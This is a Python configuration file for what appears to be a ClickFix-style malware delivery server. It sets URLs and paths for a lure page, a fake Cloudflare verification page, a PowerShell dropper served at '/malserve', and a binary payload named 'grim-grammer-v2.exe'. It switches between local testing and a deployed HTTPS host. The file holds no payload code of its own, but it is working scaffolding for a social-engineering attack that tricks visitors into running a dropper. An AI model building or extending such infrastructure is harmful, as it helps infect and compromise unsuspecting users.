import os


isDP = os.environ.get("IS_DEPLOYED","NOPE")

isDeployed = lambda is_deployed:True if is_deployed=='YEP' else False

socialENGServerFile = "pagesServer.py"
fielServerFile = "filesServer.py"
slash = "/" if isDeployed(isDP) else "\\"



proto = lambda is_deployed:'https://' if is_deployed=="YEP" else 'http://'

hookPageEndpoint = "/45f95d55-8681-46b0-8afa-6d87b02e01dc"
binName = "grim-grammer-v2.exe"
binEndpoint = "/grim-grammer-v2.exe"
dropperEndpoint = "/malserve"
dropperName = "test.ps1"
payloadFolder = f".{slash}bin{slash}" 
staticFolder = f".{slash}static{slash}"

port = "443" if isDeployed(isDP) else "80"
host = "localhost" if not isDeployed(isDP) else "UNSETTLED"
deliveryServerPort = "10000"


conf = {
    "URLS":{
        "powershell_dropper_url":f"{proto(isDP)}{host}{dropperEndpoint}",
        "actual_binary_payload":f"{proto(isDP)}{host}{binEndpoint}",
        "clickfix_page_endpoint":f"{proto(isDP)}{host}{hookPageEndpoint}"
    },
    "PATHS":{
        "cloudflare_page":f"{staticFolder}cloudflare.html",
        "clickfix_page":f"{staticFolder}clickfix.html",
        "dropper":f"{payloadFolder}{dropperName}",
        "binary_payload":f"{payloadFolder}{binName}"
    }
}